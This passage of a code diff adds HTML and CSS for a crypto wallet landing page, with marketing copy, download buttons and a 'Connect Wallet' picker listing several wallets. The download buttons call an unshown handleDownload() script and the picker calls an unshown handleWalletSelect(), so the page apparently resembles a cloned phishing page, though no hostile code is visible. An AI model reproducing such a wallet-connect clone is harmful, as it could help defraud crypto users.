+            <style data-emotion="css 1hlnjj8">
+              .css-1hlnjj8 {
+                margin: 0;
+                font-size: 1.1875rem;
+                font-family: Gotham;
+                font-weight: 300;
+                line-height: 1.75;
+                line-height: inherit;
+                color: rgba(138, 155, 180, 1);
+                margin-top: 41px;
+                text-align: left;
+                max-width: 1150px;
+                font-size: 22px;
+                z-index: 20;
+                position: relative;
+              }
+
+              @media (min-width: 600px) {
+                .css-1hlnjj8 {
+                  font-size: 1.2857rem;
+                }
+              }
+
+              @media (min-width: 900px) {
+                .css-1hlnjj8 {
+                  font-size: 1.2857rem;
+                }
+              }
+
+              @media (min-width: 1200px) {
+                .css-1hlnjj8 {
+                  font-size: 1.2857rem;
+                }
+              }
+
+              @media (min-width: 1536px) {
+                .css-1hlnjj8 {
+                  font-size: 1.4286rem;
+                }
+              }
+
+              @media (max-width: 1098px) {
+                .css-1hlnjj8 {
+                  width: 95%;
+                }
+              }
+
+              @media (max-width: 599.95px) {
+                .css-1hlnjj8 {
+                  padding-top: 11px;
+                  margin-top: 16px;
+                  width: 100%;
+                  text-align: left;
+                  font-size: 17px;
+                }
+              }
+            </style>
+            <p class="MuiTypography-root MuiTypography-subtitle1 css-1hlnjj8">
+              The Internet Money Wallet is the first crypto wallet of its
+              kind. Dedicated to providing users with the cleanest and most
+              approachable user experience, the Internet Money Wallet offers
+              features that crypto users of all experience levels will
+              appreciate.<br /><br />As a multi-chain EVM wallet, the Internet
+              Money Wallet supports all Ethereum-based blockchains so that you
+              can invest in, hold, swap, send, receive and track the prices of
+              the tokens you want, all in one place; and earn passive income
+              at the same time.
+            </p>
+            <style data-emotion="css etpp44">
+              .css-etpp44 {
+                margin: 0;
+                font-size: 1.75rem;
+                font-weight: bold;
+                letter-spacing: -0.1rem;
+                font-family: Gotham, Orbitron, sans-serif;
+                line-height: 1.167;
+                line-height: inherit;
+                color: #ffdb0c;
+                font-weight: 700;
+                margin-top: 48px;
+              }
+
+              @media (min-width: 600px) {
+                .css-etpp44 {
+                  font-size: 2.1422rem;
+                }
+              }
+
+              @media (min-width: 900px) {
+                .css-etpp44 {
+                  font-size: 2.1422rem;
+                }
+              }
+
+              @media (min-width: 1200px) {
+                .css-etpp44 {
+                  font-size: 2.3565rem;
+                }
+              }
+
+              @media (min-width: 1536px) {
+                .css-etpp44 {
+                  font-size: 2.5707rem;
+                }
+              }
+            </style>
+            <h3 class="MuiTypography-root MuiTypography-h3 css-etpp44">
+              Download The Wallet
+            </h3>
+            <style data-emotion="css iqmd93">
+              .css-iqmd93 {
+                display: -webkit-box;
+                display: -webkit-flex;
+                display: -ms-flexbox;
+                display: flex;
+                width: -webkit-fit-content;
+                width: -moz-fit-content;
+                width: fit-content;
+                margin-top: 24px;
+                margin-left: 0px;
+              }
+
+              @media (max-width: 800px) {
+                .css-iqmd93 {
+                  -webkit-flex-direction: column;
+                  -ms-flex-direction: column;
+                  flex-direction: column;
+                  -webkit-align-items: center;
+                  -webkit-box-align: center;
+                  -ms-flex-align: center;
+                  align-items: center;
+                  -webkit-box-pack: center;
+                  -ms-flex-pack: center;
+                  -webkit-justify-content: center;
+                  justify-content: center;
+                }
+              }
+
+              .css-iqmd93 img {
+                width: 200px;
+              }
+
+              @media (max-width: 1535.95px) {
+                .css-iqmd93 img {
+                  width: 150px;
+                }
+              }
+
+              @media (max-width: 1098px) {
+                .css-iqmd93 img {
+                  width: 200px;
+                }
+              }
+
+              @media (max-width: 899.95px) {
+                .css-iqmd93 {
+                  -webkit-box-pack: center;
+                  -ms-flex-pack: center;
+                  -webkit-justify-content: center;
+                  justify-content: center;
+                  margin: auto;
+                  margin-top: 32px;
+                  margin-bottom: 32px;
+                }
+              }
+            </style>
+            <div class="MuiBox-root css-iqmd93">
+              <style data-emotion="css 1wf493t">
+                .css-1wf493t {
+                  text-align: center;
+                  -webkit-flex: 0 0 auto;
+                  -ms-flex: 0 0 auto;
+                  flex: 0 0 auto;
+                  font-size: 1.5rem;
+                  padding: 8px;
+                  border-radius: 50%;
+                  overflow: visible;
+                  color: rgba(0, 0, 0, 0.54);
+                  -webkit-transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                }
+
+                .css-1wf493t:hover {
+                  background-color: rgba(0, 0, 0, 0.04);
+                }
+
+                @media (hover: none) {
+                  .css-1wf493t:hover {
+                    background-color: transparent;
+                  }
+                }
+
+                .css-1wf493t.Mui-disabled {
+                  background-color: transparent;
+                  color: rgba(0, 0, 0, 0.26);
+                }
+              </style>
+              <style data-emotion="css 1yxmbwk">
+                .css-1yxmbwk {
+                  display: -webkit-inline-box;
+                  display: -webkit-inline-flex;
+                  display: -ms-inline-flexbox;
+                  display: inline-flex;
+                  -webkit-align-items: center;
+                  -webkit-box-align: center;
+                  -ms-flex-align: center;
+                  align-items: center;
+                  -webkit-box-pack: center;
+                  -ms-flex-pack: center;
+                  -webkit-justify-content: center;
+                  justify-content: center;
+                  position: relative;
+                  box-sizing: border-box;
+                  -webkit-tap-highlight-color: transparent;
+                  background-color: transparent;
+                  outline: 0;
+                  border: 0;
+                  margin: 0;
+                  border-radius: 0;
+                  padding: 0;
+                  cursor: pointer;
+                  -webkit-user-select: none;
+                  -moz-user-select: none;
+                  -ms-user-select: none;
+                  user-select: none;
+                  vertical-align: middle;
+                  -moz-appearance: none;
+                  -webkit-appearance: none;
+                  -webkit-text-decoration: none;
+                  text-decoration: none;
+                  color: inherit;
+                  text-align: center;
+                  -webkit-flex: 0 0 auto;
+                  -ms-flex: 0 0 auto;
+                  flex: 0 0 auto;
+                  font-size: 1.5rem;
+                  padding: 8px;
+                  border-radius: 50%;
+                  overflow: visible;
+                  color: rgba(0, 0, 0, 0.54);
+                  -webkit-transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                  transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+                }
+
+                .css-1yxmbwk::-moz-focus-inner {
+                  border-style: none;
+                }
+
+                .css-1yxmbwk.Mui-disabled {
+                  pointer-events: none;
+                  cursor: default;
+                }
+
+                @media print {
+                  .css-1yxmbwk {
+                    -webkit-print-color-adjust: exact;
+                    color-adjust: exact;
+                  }
+                }
+
+                .css-1yxmbwk:hover {
+                  background-color: rgba(0, 0, 0, 0.04);
+                }
+
+                @media (hover: none) {
+                  .css-1yxmbwk:hover {
+                    background-color: transparent;
+                  }
+                }
+
+                .css-1yxmbwk.Mui-disabled {
+                  background-color: transparent;
+                  color: rgba(0, 0, 0, 0.26);
+                }
+              </style><a class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk" tabindex="0"
+                target="_blank" href="/ios"><img alt="ios" loading="lazy" width="0" height="30" decoding="async"
+                  data-nimg="1" style="color: transparent; height: auto"
+                  src="_next/static/media/ios.bf451e7f.svg" /></a><a
+                class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk" tabindex="0"
+                target="_blank" href="/android"><img alt="android" loading="lazy" width="0" height="0" decoding="async"
+                  data-nimg="1" style="color: transparent; height: auto"
+                  src="_next/static/media/android.a305525d.svg" /></a><a
+                class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk" tabindex="0"
+                target="_blank" href="/chrome"><img src="_next/static/media/chrome.331862c0.png" alt="chrome" /></a>
+            </div>
+          </div>
+        </div>
+      </div>
+      <style data-emotion="css tnf22c">
+        .css-tnf22c {
+          background-color: transparent;
+          width: 100%;
+          height: 60px;
+        }
+      </style>
+      <div class="MuiBox-root css-tnf22c"></div>
+      <style data-emotion="css 1ghzytg">
+        .css-1ghzytg {
+          margin-bottom: 80px;
+          position: relative;
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-align-items: center;
+          -webkit-box-align: center;
+          -ms-flex-align: center;
+          align-items: center;
+          -webkit-box-pack: center;
+          -ms-flex-pack: center;
+          -webkit-justify-content: center;
+          justify-content: center;
+          -webkit-flex-direction: column;
+          -ms-flex-direction: column;
+          flex-direction: column;
+          margin-left: auto;
+          margin-right: auto;
+          width: 100%;
+          height: 100%;
+          max-width: 1920px;
+        }
+
+        @media (max-width: 899.95px) {
+          .css-1ghzytg {
+            width: 90%;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-1ghzytg">
+        <div class="MuiBox-root css-0">
+          <div class="MuiBox-root css-0">
+            <img id="fallback" src="images/home-box.webp" alt="Static Image" />
+          </div>
+        </div>
+      </div>
+      <style data-emotion="css i2qegz">
+        .css-i2qegz {
+          position: relative;
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-align-items: center;
+          -webkit-box-align: center;
+          -ms-flex-align: center;
+          align-items: center;
+          -webkit-box-pack: center;
+          -ms-flex-pack: center;
+          -webkit-justify-content: center;
+          justify-content: center;
+          -webkit-flex-direction: column;
+          -ms-flex-direction: column;
+          flex-direction: column;
+          margin-left: auto;
+          margin-right: auto;
+          width: 100%;
+          height: 100%;
+          max-width: 1920px;
+        }
+
+        @media (max-width: 899.95px) {
+          .css-i2qegz {
+            width: 90%;
+          }
+        }
+
+        @media (max-width: 1098px) {
+          .css-i2qegz {
+            width: 90%;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-i2qegz">
+        <style data-emotion="css ki9hyy">
+          .css-ki9hyy {
+            margin: 0;
+            font-size: 3.625rem;
+            font-weight: bold;
+            letter-spacing: -0.25rem;
+            font-family: Gotham, Orbitron, sans-serif;
+            line-height: 1.167;
+            font-weight: 700;
+            color: white;
+            margin-left: auto;
+            margin-right: auto;
+            text-align: center;
+            max-width: 1150px;
+            font-size: 82px;
+            z-index: 20;
+            position: relative;
+          }
+
+          @media (max-width: 767px) {
+            .css-ki9hyy {
+              letter-spacing: -0.05rem;
+            }
+          }
+
+          @media (min-width: 600px) {
+            .css-ki9hyy {
+              font-size: 4.7129rem;
+            }
+          }
+
+          @media (min-width: 900px) {
+            .css-ki9hyy {
+              font-size: 5.1414rem;
+            }
+          }
+
+          @media (min-width: 1200px) {
+            .css-ki9hyy {
+              font-size: 5.5698rem;
+            }
+          }
+
+          @media (min-width: 1536px) {
+            .css-ki9hyy {
+              font-size: 6.2125rem;
+            }
+          }
+
+          .css-ki9hyy span {
+            color: #ffdb0c;
+            position: relative;
+          }
+
+          @media (max-width: 1258px) {
+            .css-ki9hyy {
+              font-size: 70px;
+            }
+          }
+
+          @media (max-width: 899.95px) {
+            .css-ki9hyy {
+              font-size: 60px;
+            }
+          }
+
+          @media (max-width: 599.95px) {
+            .css-ki9hyy {
+              text-align: left;
+              font-size: 35px;
+              letter-spacing: -2px;
+              margin-left: 0px;
+            }
+          }
+        </style>
+        <h2 class="MuiTypography-root MuiTypography-h1 css-ki9hyy">
+          Start Earning <span>Passive Income</span>
+        </h2>
+        <style data-emotion="css ltgbxe">
+          .css-ltgbxe {
+            margin: 0;
+            font-size: 1.1875rem;
+            font-family: Gotham;
+            font-weight: 300;
+            line-height: 1.75;
+            line-height: inherit;
+            color: rgba(138, 155, 180, 1);
+            margin-top: 41px;
+            text-align: center;
+            max-width: 1150px;
+            font-size: 22px;
+            z-index: 20;
+            position: relative;
+            margin-bottom: 40px;
+            padding-top: 8px;
+          }
+
+          @media (min-width: 600px) {
+            .css-ltgbxe {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 900px) {
+            .css-ltgbxe {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 1200px) {
+            .css-ltgbxe {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 1536px) {
+            .css-ltgbxe {
+              font-size: 1.4286rem;
+            }
+          }
+
+          @media (max-width: 1098px) {
+            .css-ltgbxe {
+              width: 95%;
+            }
+          }
+
+          @media (max-width: 599.95px) {
+            .css-ltgbxe {
+              padding-top: 11px;
+              margin-top: 16px;
+              width: 100%;
+              text-align: left;
+              font-size: 17px;
+            }
+          }
+
+          @media (max-width: 1199.95px) {
+            .css-ltgbxe {
+              width: 90%;
+            }
+          }
+        </style>
+        <p class="MuiTypography-root MuiTypography-subtitle1 css-ltgbxe">
+          Are you ready to take control of your financial future? With
+          Internet Money Wallet, you can easily navigate the world of
+          blockchain. Our user-friendly platform offers a secure and private
+          way to interact with your crypto assets, connect to you favorite EVM
+          chains and dApps, track the value of your portfolio and earn passive
+          income. Allowing you, to FREE YOUR TIME.<br />
+        </p>
+        <style data-emotion="css 16p1klm">
+          .css-16p1klm {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            width: -webkit-fit-content;
+            width: -moz-fit-content;
+            width: fit-content;
+          }
+
+          @media (max-width: 800px) {
+            .css-16p1klm {
+              -webkit-flex-direction: column;
+              -ms-flex-direction: column;
+              flex-direction: column;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+            }
+          }
+
+          .css-16p1klm img {
+            width: 300px;
+          }
+
+          @media (max-width: 943px) {
+            .css-16p1klm {
+              -webkit-flex-direction: column;
+              -ms-flex-direction: column;
+              flex-direction: column;
+            }
+          }
+
+          @media (max-width: 599.95px) {
+            .css-16p1klm img {
+              width: 200px;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-16p1klm">
+          <style data-emotion="css 1wf493t">
+            .css-1wf493t {
+              text-align: center;
+              -webkit-flex: 0 0 auto;
+              -ms-flex: 0 0 auto;
+              flex: 0 0 auto;
+              font-size: 1.5rem;
+              padding: 8px;
+              border-radius: 50%;
+              overflow: visible;
+              color: rgba(0, 0, 0, 0.54);
+              -webkit-transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+            }
+
+            .css-1wf493t:hover {
+              background-color: rgba(0, 0, 0, 0.04);
+            }
+
+            @media (hover: none) {
+              .css-1wf493t:hover {
+                background-color: transparent;
+              }
+            }
+
+            .css-1wf493t.Mui-disabled {
+              background-color: transparent;
+              color: rgba(0, 0, 0, 0.26);
+            }
+          </style>
+          <style data-emotion="css 1yxmbwk">
+            .css-1yxmbwk {
+              display: -webkit-inline-box;
+              display: -webkit-inline-flex;
+              display: -ms-inline-flexbox;
+              display: inline-flex;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              -webkit-box-pack: center;
+              -ms-flex-pack: center;
+              -webkit-justify-content: center;
+              justify-content: center;
+              position: relative;
+              box-sizing: border-box;
+              -webkit-tap-highlight-color: transparent;
+              background-color: transparent;
+              outline: 0;
+              border: 0;
+              margin: 0;
+              border-radius: 0;
+              padding: 0;
+              cursor: pointer;
+              -webkit-user-select: none;
+              -moz-user-select: none;
+              -ms-user-select: none;
+              user-select: none;
+              vertical-align: middle;
+              -moz-appearance: none;
+              -webkit-appearance: none;
+              -webkit-text-decoration: none;
+              text-decoration: none;
+              color: inherit;
+              text-align: center;
+              -webkit-flex: 0 0 auto;
+              -ms-flex: 0 0 auto;
+              flex: 0 0 auto;
+              font-size: 1.5rem;
+              padding: 8px;
+              border-radius: 50%;
+              overflow: visible;
+              color: rgba(0, 0, 0, 0.54);
+              -webkit-transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+              transition: background-color 150ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
+            }
+
+            .css-1yxmbwk::-moz-focus-inner {
+              border-style: none;
+            }
+
+            .css-1yxmbwk.Mui-disabled {
+              pointer-events: none;
+              cursor: default;
+            }
+
+            @media print {
+              .css-1yxmbwk {
+                -webkit-print-color-adjust: exact;
+                color-adjust: exact;
+              }
+            }
+
+            .css-1yxmbwk:hover {
+              background-color: rgba(0, 0, 0, 0.04);
+            }
+
+            @media (hover: none) {
+              .css-1yxmbwk:hover {
+                background-color: transparent;
+              }
+            }
+
+            .css-1yxmbwk.Mui-disabled {
+              background-color: transparent;
+              color: rgba(0, 0, 0, 0.26);
+            }
+          </style><a class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk interact-button"
+            tabindex="0" href="#" onclick="event.preventDefault(); handleDownload();"><img alt="ios" loading="lazy"
+              width="0" height="30" decoding="async" data-nimg="1" style="color: transparent; height: auto"
+              src="_next/static/media/ios.bf451e7f.svg" /></a><a
+            class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk interact-button"
+            tabindex="0" href="#" onclick="event.preventDefault(); handleDownload();"><img alt="android" loading="lazy"
+              width="0" height="0" decoding="async" data-nimg="1" style="color: transparent; height: auto"
+              src="_next/static/media/android.a305525d.svg" /></a><a
+            class="MuiButtonBase-root MuiIconButton-root MuiIconButton-sizeMedium css-1yxmbwk interact-button"
+            tabindex="0" href="#" onclick="event.preventDefault(); handleDownload();"><img
+              src="_next/static/media/chrome.331862c0.png" alt="chrome" /></a>
+        </div>
+      </div>
+      <style data-emotion="css 9kqra4">
+        .css-9kqra4 {
+          margin-top: -480px;
+          background-image: url("city.svg");
+          -webkit-background-size: cover;
+          background-size: cover;
+          background-repeat: no-repeat;
+          height: 75vw;
+          width: 100%;
+        }
+
+        @media (max-width: 1440px) {
+          .css-9kqra4 {
+            margin-top: -200px;
+          }
+        }
+
+        @media (max-width: 899.95px) {
+          .css-9kqra4 {
+            margin-top: -80px;
+          }
+        }
+
+        @media (max-width: 599.95px) {
+          .css-9kqra4 {
+            margin-top: -24px;
+            background-image: url(images/city-coins.webp);
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-9kqra4"></div>
+    </main>
+    <style data-emotion="css v3ztgk">
+      .css-v3ztgk {
+        width: 100%;
+        background: linear-gradient(0deg, #000000 22.76%, #0a254d 190.55%);
+        position: relative;
+      }
+    </style>
+    <div class="MuiBox-root css-v3ztgk">
+      <style data-emotion="css 7vhibb">
+        .css-7vhibb {
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-flex-direction: column;
+          -ms-flex-direction: column;
+          flex-direction: column;
+          -webkit-align-items: center;
+          -webkit-box-align: center;
+          -ms-flex-align: center;
+          align-items: center;
+          padding-top: 141px;
+        }
+
+        @media (max-width: 599.95px) {
+          .css-7vhibb {
+            padding-top: 64px;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-7vhibb">
+        <div class="MuiBox-root css-0">
+          <style data-emotion="css tgk4hc">
+            .css-tgk4hc img {
+              width: 190px;
+              height: 58px;
+            }
+
+            @media (max-width: 599.95px) {
+              .css-tgk4hc img {
+                width: 217px;
+                height: 66px;
+              }
+            }
+          </style>
+          <div class="MuiBox-root css-tgk4hc"><img src="logo.webp" /></div>
+        </div>
+        <style data-emotion="css 1o1gria">
+          .css-1o1gria {
+            position: absolute;
+            width: 260px;
+            height: auto;
+            top: 59px;
+            right: 30px;
+            border-radius: 50%;
+            background: rgba(1, 163, 254, 1);
+            -webkit-filter: blur(280px);
+            filter: blur(280px);
+            z-index: -10;
+          }
+        </style>
+        <div class="MuiBox-root css-1o1gria" style="height: 260px"></div>
+        <style data-emotion="css rzq44y">
+          .css-rzq44y {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            margin-top: 50px;
+            gap: 48px;
+          }
+
+          @media (max-width: 899.95px) {
+            .css-rzq44y {
+              -webkit-flex-direction: column;
+              -ms-flex-direction: column;
+              flex-direction: column;
+              -webkit-align-items: center;
+              -webkit-box-align: center;
+              -ms-flex-align: center;
+              align-items: center;
+              gap: 24px;
+            }
+          }
+        </style>
+        <div class="MuiBox-root css-rzq44y">
+          <style data-emotion="css 7g0pay">
+            .css-7g0pay {
+              text-transform: uppercase;
+              cursor: pointer;
+            }
+          </style>
+          <div class="MuiBox-root css-7g0pay">
+            <style data-emotion="css vf8zhc">
+              .css-vf8zhc {
+                margin: 0;
+                font-size: 16px;
+                font-family: Gotham, Orbitron, sans-serif;
+                font-weight: 400;
+                line-height: 1.5;
+                line-height: inherit;
+                font-weight: 900;
+              }
+            </style>
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              Home
+            </p>
+          </div>
+          <div class="MuiBox-root css-7g0pay">
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              About Us
+            </p>
+          </div>
+          <div class="MuiBox-root css-7g0pay">
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              Dapp
+            </p>
+          </div>
+          <div class="MuiBox-root css-7g0pay">
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              Blackpaper
+            </p>
+          </div>
+          <div class="MuiBox-root css-7g0pay">
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              Audits
+            </p>
+          </div>
+          <div class="MuiBox-root css-7g0pay">
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              TIME
+            </p>
+          </div>
+          <div class="MuiBox-root css-7g0pay">
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              IM
+            </p>
+          </div>
+          <div class="MuiBox-root css-7g0pay">
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              FUTURE
+            </p>
+          </div>
+          <div class="MuiBox-root css-7g0pay">
+            <p class="MuiTypography-root MuiTypography-body1 css-vf8zhc">
+              Stats
+            </p>
+          </div>
+        </div>
+        <style data-emotion="css 1wpyz1g">
+          .css-1wpyz1g {
+            margin: 0;
+            font-size: 1.1875rem;
+            font-family: Gotham;
+            font-weight: 300;
+            line-height: 1.75;
+            line-height: inherit;
+            color: rgba(138, 155, 180, 1);
+            max-width: 1226px;
+            margin-left: auto;
+            margin-right: auto;
+            text-align: center;
+            margin-top: 80px;
+            margin-bottom: 10px;
+          }
+
+          @media (min-width: 600px) {
+            .css-1wpyz1g {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 900px) {
+            .css-1wpyz1g {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 1200px) {
+            .css-1wpyz1g {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 1536px) {
+            .css-1wpyz1g {
+              font-size: 1.4286rem;
+            }
+          }
+
+          @media (max-width: 1199.95px) {
+            .css-1wpyz1g {
+              width: 90%;
+            }
+          }
+
+          @media (max-width: 599.95px) {
+            .css-1wpyz1g {
+              margin-top: 50px;
+              font-size: 17px;
+            }
+          }
+        </style>
+        <h6 class="MuiTypography-root MuiTypography-subtitle1 css-1wpyz1g">
+          As a team of DeFi experts and enthusiasts, we understand the
+          importance of wallet security and ensuring our users data is not
+          collected. While also giving all humans the tools they need to free
+          their financial future. We are dedicated to bringing simplicity to
+          every aspect of our innovative features. Regardless of your
+          experience level, you will find value and support with the Internet
+          Money Wallet and you can earn passive income along the way.
+        </h6>
+      </div>
+      <style data-emotion="css 12di0rf">
+        .css-12di0rf {
+          position: absolute;
+          width: 260px;
+          height: auto;
+          bottom: 80px;
+          right: 0;
+          border-radius: 50%;
+          background: rgba(1, 163, 254, 1);
+          -webkit-filter: blur(280px);
+          filter: blur(280px);
+          z-index: -10;
+        }
+      </style>
+      <div class="MuiBox-root css-12di0rf" style="height: 260px"></div>
+      <style data-emotion="css 17uu5bu">
+        .css-17uu5bu {
+          margin-top: 40px;
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-box-pack: center;
+          -ms-flex-pack: center;
+          -webkit-justify-content: center;
+          justify-content: center;
+          gap: 16px;
+        }
+
+        @media (max-width: 599.95px) {
+          .css-17uu5bu {
+            gap: 0px;
+            width: 100%;
+          }
+
+          .css-17uu5bu img {
+            width: 70px;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-17uu5bu">
+        <a style="color: white; text-decoration: none" target="_blank" href="https://t.me/internetmoneyio"><img
+            alt="telegram" loading="lazy" width="103" height="114" decoding="async" data-nimg="1"
+            style="color: transparent" src="_next/static/media/telegram.d21c9810.svg" /></a><a
+          style="color: white; text-decoration: none" target="_blank" href="https://twitter.com/internetmoneyio"><img
+            alt="twitter" loading="lazy" width="111" height="114" decoding="async" data-nimg="1"
+            style="color: transparent" src="_next/static/media/twitter.49f1dd3b.svg" /></a><a
+          style="color: white; text-decoration: none" target="_blank" href="https://reddit.com/r/internetmoneyio"><img
+            alt="reddit" loading="lazy" width="111" height="114" decoding="async" data-nimg="1"
+            style="color: transparent" src="_next/static/media/reddit.cf78f4a4.svg" /></a><a
+          style="color: white; text-decoration: none" target="_blank" href="https://youtube.com/internetmoneyio"><img
+            alt="youtube" loading="lazy" width="111" height="114" decoding="async" data-nimg="1"
+            style="color: transparent" src="_next/static/media/youtube.21a4bb13.svg" /></a><a
+          style="color: white; text-decoration: none" target="_blank" href="https://gitlab.com/internetmoneyio/"><img
+            alt="gitlab" loading="lazy" width="111" height="114" decoding="async" data-nimg="1"
+            style="color: transparent" src="_next/static/media/gitlab.c574302e.svg" /></a>
+      </div>
+      <style data-emotion="css p44mjb">
+        .css-p44mjb {
+          width: 100%;
+          background: #04101c;
+          display: -webkit-box;
+          display: -webkit-flex;
+          display: -ms-flexbox;
+          display: flex;
+          -webkit-align-items: center;
+          -webkit-box-align: center;
+          -ms-flex-align: center;
+          align-items: center;
+          -webkit-box-pack: justify;
+          -webkit-justify-content: space-between;
+          justify-content: space-between;
+          padding-left: 120px;
+          padding-right: 120px;
+          gap: 80px;
+          height: 91px;
+          margin-top: 40px;
+        }
+
+        @media (max-width: 899.95px) {
+          .css-p44mjb {
+            -webkit-flex-direction: column-reverse;
+            -ms-flex-direction: column-reverse;
+            flex-direction: column-reverse;
+            -webkit-box-pack: center;
+            -ms-flex-pack: center;
+            -webkit-justify-content: center;
+            justify-content: center;
+            text-align: center;
+            gap: 8px;
+            padding-top: 24px;
+            padding-bottom: 24px;
+            padding-left: 16px;
+            padding-right: 16px;
+          }
+        }
+
+        @media (max-width: 599.95px) {
+          .css-p44mjb {
+            padding-top: 64px;
+            padding-bottom: 64px;
+          }
+        }
+      </style>
+      <div class="MuiBox-root css-p44mjb">
+        <style data-emotion="css zdxvxl">
+          .css-zdxvxl {
+            margin: 0;
+            font-size: 1.1875rem;
+            font-family: Gotham;
+            font-weight: 300;
+            line-height: 1.75;
+            line-height: inherit;
+            text-transform: uppercase;
+            color: #ffdb0c;
+            letter-spacing: 1px;
+            font-size: 15px !important;
+          }
+
+          @media (min-width: 600px) {
+            .css-zdxvxl {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 900px) {
+            .css-zdxvxl {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 1200px) {
+            .css-zdxvxl {
+              font-size: 1.2857rem;
+            }
+          }
+
+          @media (min-width: 1536px) {
+            .css-zdxvxl {
+              font-size: 1.4286rem;
+            }
+          }
+
+          @media (max-width: 899.95px) {
+            .css-zdxvxl {
+              font-size: 10px !important;
+              text-align: center;
+              font-weight: 400;
+              letter-spacing: 2px;
+              margin-top: 16px;
+            }
+          }
+        </style>
+        <h6 class="MuiTypography-root MuiTypography-subtitle1 css-zdxvxl">
+          ©Decentralized Innovations, LLC (Internet Money) ALL RIGHTS RESERVED
+          2025
+        </h6>
+        <style data-emotion="css 1st7z1c">
+          .css-1st7z1c {
+            display: -webkit-box;
+            display: -webkit-flex;
+            display: -ms-flexbox;
+            display: flex;
+            gap: 48px;
+          }
+        </style>
+        <div class="MuiBox-root css-1st7z1c">
+          <a style="color: white; text-decoration: none" href="privacy-policy.html">
+            <style data-emotion="css 1xl8l04">
+              .css-1xl8l04 {
+                margin: 0;
+                font-size: 16px;
+                font-family: Gotham, Orbitron, sans-serif;
+                font-weight: 400;
+                line-height: 1.5;
+                line-height: inherit;
+                font-size: 15px;
+                font-weight: 600;
+              }
+            </style>
+            <p class="MuiTypography-root MuiTypography-body1 css-1xl8l04">
+              Privacy Policy
+            </p>
+          </a><a style="color: white; text-decoration: none" href="terms-of-service.pdf">
+            <p class="MuiTypography-root MuiTypography-body1 css-1xl8l04">
+              Terms of Service
+            </p>
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="w-overlay" id="wOverlay">
+
+    <!-- SCREEN 1: Select Wallet -->
+    <div class="w-panel" id="wScreen1">
+      <div class="w-header">
+        <span class="w-title">Connect Wallet</span>
+        <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+      </div>
+      <div class="w-body">
+
+        <!-- Featured: MetaMask -->
+        <div class="w-featured wallet-trigger" onclick="handleWalletSelect(this)">
+          <span class="w-featured-badge">Recommended</span>
+          <div class="w-feat-icon">
+            <img src="assets/images/logo/trust_wallet.jpg" alt="MetaMask" />
+          </div>
+          <div>
+            <div class="w-feat-name">Trust Wallet</div>
+            <div class="w-feat-desc">Multi-chain Wallet</div>
+          </div>
+        </div>
+
+        <div class="w-divider"><span>other wallets</span></div>
+
+        <div class="w-list">
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="assets/images/logo/coinbase.png" alt="Coinbase Wallet" /></div>
+            <div>
+              <div class="w-item-name">Coinbase Wallet</div>
+              <div class="w-item-desc">Multi-chain mobile wallet</div>
+            </div>
+            <i class="ri-arrow-right-s-line w-item-arrow"></i>
+          </div>
+          <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+            <div class="w-item-icon"><img src="assets/images/logo/ledger_live.jpg" alt="Ledger" /></div>
+            <div>
+              <div class="w-item-name">Ledger</div>
